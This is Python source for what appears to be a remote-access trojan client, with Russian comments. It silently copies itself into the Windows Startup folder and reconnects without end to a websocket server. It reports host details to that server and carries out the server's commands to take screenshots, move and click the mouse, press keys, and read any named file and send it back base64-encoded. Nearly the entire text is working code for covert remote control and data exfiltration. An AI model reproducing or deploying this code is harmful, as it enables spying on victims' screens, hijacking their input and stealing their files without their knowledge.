import asyncio
import websockets
import pyautogui
from PIL import Image
import base64
import io
import os
import requests
import subprocess
import sys
import shutil
import platform
import psutil
import uuid
CONFIG_FILE = "client_config.json"

import json
def get_or_generate_uuid():
    # Проверяем, существует ли файл конфигурации
    if os.path.exists(CONFIG_FILE):
        with open(CONFIG_FILE, "r") as f:
            config = json.load(f)
            return config.get("uuid")
    
    # Если файла нет, генерируем новый UUID
    new_uuid = str(uuid.uuid4())
    config = {"uuid": new_uuid}
    
    # Сохраняем UUID в файл
    with open(CONFIG_FILE, "w") as f:
        json.dump(config, f)
    
    return new_uuid
def get_system_info():
    # Получаем информацию о системе
    system_info = {
        "username": platform.node(),  # Имя пользователя или имя хоста
        "os": platform.system(),      # Операционная система
        "processor": platform.processor(),  # Информация о процессоре
        "ram_total": round(psutil.virtual_memory().total / (1024 ** 3), 2),  # Общий объём RAM в ГБ
        "screen_resolution": {"width": pyautogui.size().width, "height": pyautogui.size().height}  # Разрешение экрана
    }
    return system_info

# Добавление в автозагрузку
def add_to_startup():
    # Получаем путь к исполняемому файлу
    executable_path = os.path.abspath(sys.executable)
    # Путь к папке автозагрузки
    startup_folder = os.path.join(os.getenv("APPDATA"), "Microsoft", "Windows", "Start Menu", "Programs", "Startup")
    
    try:
        # Копируем исполняемый файл в папку автозагрузки
        shutil.copy(executable_path, startup_folder)
        print("Приложение успешно добавлено в автозагрузку.")
    except Exception as e:
        print(f"Ошибка при добавлении в автозагрузку: {e}")

# Функция для создания скриншота
def capture_screenshot():
    screenshot = pyautogui.screenshot()
    buffer = io.BytesIO()
    screenshot.save(buffer, format="JPEG", quality=75)
    img_str = base64.b64encode(buffer.getvalue()).decode("utf-8")
    return img_str

# Обработка команд от сервера
async def handle_command(websocket, command):
    if command == "ping":
        await websocket.send(f"pong:{asyncio.get_event_loop().time()}")
    elif command == "screenshot":
        screenshot_data = capture_screenshot()
        await websocket.send(screenshot_data)
    elif command.startswith("move_mouse"):
        _, x, y = command.split()
        pyautogui.moveTo(int(x), int(y))
        await websocket.send("mouse_moved")
        print(f"Курсор перемещён в координаты: ({x}, {y})")
    elif command.startswith("press_mouse"):
        _, button = command.split()
        if button == "left":
            pyautogui.click(button="left")
        elif button == "right":
            pyautogui.click(button="right")
        await websocket.send("mouse_pressed")
    elif command.startswith("press_key"):
        _, key = command.split()
        pyautogui.press(key)
        await websocket.send("key_pressed")
    elif command.startswith("send_file"):
        _, file_name = command.split()
        if os.path.exists(file_name):
            with open(file_name, "rb") as file:
                file_data = file.read()
                encoded_data = base64.b64encode(file_data).decode("utf-8")
                await websocket.send(encoded_data)
        else:
            await websocket.send("file_not_found")

# Подключение к серверу
# Отправка информации о системе
async def connect_to_server():
    uri = "ws://localhost:8765"
    
    while True:  # Бесконечный цикл для переподключения
        try:
            print("Попытка подключения к серверу...")
            async with websockets.connect(uri) as websocket:
                print("Успешно подключено к серверу.")
                
                # Получаем уникальный UUID клиента
                client_uuid = get_or_generate_uuid()
                
                # Собираем информацию о системе
                system_info = get_system_info()
                system_info["uuid"] = client_uuid  # Добавляем UUID
                
                # Отправляем информацию о системе серверу
                await websocket.send(f"system_info:{json.dumps(system_info)}")
                
                # Основной цикл для обработки команд
                while True:
                    command = await websocket.recv()
                    await handle_command(websocket, command)
        
        except (websockets.exceptions.ConnectionClosed, ConnectionRefusedError):
            print("Соединение с сервером разорвано. Повторная попытка через 5 секунд...")
        
        except Exception as e:
            print(f"Произошла ошибка: {e}. Повторная попытка через 5 секунд...")
        
        # Ждём 5 секунд перед следующей попыткой подключения
        await asyncio.sleep(5)

# Запуск клиента
if __name__ == "__main__":
    add_to_startup()
    asyncio.run(connect_to_server())